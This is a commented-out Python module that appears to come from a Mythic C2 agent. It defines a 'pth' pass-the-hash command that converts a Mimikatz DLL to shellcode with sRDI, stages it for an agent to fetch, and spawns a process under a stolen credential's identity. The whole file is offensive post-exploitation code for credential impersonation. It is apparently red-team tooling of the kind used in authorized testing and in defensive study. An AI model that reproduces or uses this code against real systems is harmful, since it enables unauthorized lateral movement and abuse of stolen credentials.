# from mythic_payloadtype_container.MythicCommandBase import *
# import json
# from uuid import uuid4
# from sRDI import ShellcodeRDI
# from os import path
# from mythic_payloadtype_container.MythicRPC import *
# import base64

# class PTHArguments(TaskArguments):

#     def __init__(self, command_line, **kwargs):
#         super().__init__(command_line, **kwargs)
#         self.args = {
#             "credential": CommandParameter(name="Credential", type=ParameterType.Credential_JSON),
#             "program": CommandParameter(name="Program to Spawn", type=ParameterType.String, default_value="cmd.exe")
#         }

#     async def parse_arguments(self):
#         if len(self.command_line) == 0:
#             raise Exception("PTH requires arguments.")
#         if self.command_line[0] != "{":
#             raise Exception("Require JSON blob, but got raw command line.")
#         self.load_args_from_json_string(self.command_line)
#         self.add_arg("pipe_name", str(uuid4()))


# class PTHCommand(CommandBase):
#     cmd = "pth"
#     needs_admin = False
#     help_cmd = "pth (modal popup)"
#     description = "Use pass-the-hash using an RC4 hash to impersonate the specified user."
#     version = 2
#     is_exit = False
#     is_file_browse = False
#     is_process_list = False
#     is_download_file = False
#     is_upload_file = False
#     is_remove_file = False
#     author = "@djhohnstein"
#     argument_class = PTHArguments
#     browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
#     attackmapping = ["T1550"]

#     async def create_tasking(self, task: MythicTask) -> MythicTask:
#         dllFile = path.join(self.agent_code_path, f"mimikatz_{task.callback.architecture}.dll")
#         dllBytes = open(dllFile, 'rb').read()
#         converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("smb_server_wmain"), task.args.get_arg("pipe_name").encode(), 0)
#         file_resp = await MythicRPC().execute("create_file",
#                                                task_id=task.id,
#                                                file=base64.b64encode(converted_dll).decode(),
#                                                delete_after_fetch=True)
#         if file_resp.status == MythicStatus.Success:
#             task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
#         else:
#             raise Exception("Failed to register Mimikatz DLL: " + file_resp.error)
#         task.display_params = "Spawning {} with {}'s credentials".format(task.args.get_arg("program"), task.args.get_arg("credential")["account"])
#         return task

#     async def process_response(self, response: AgentResponse):
#         pass
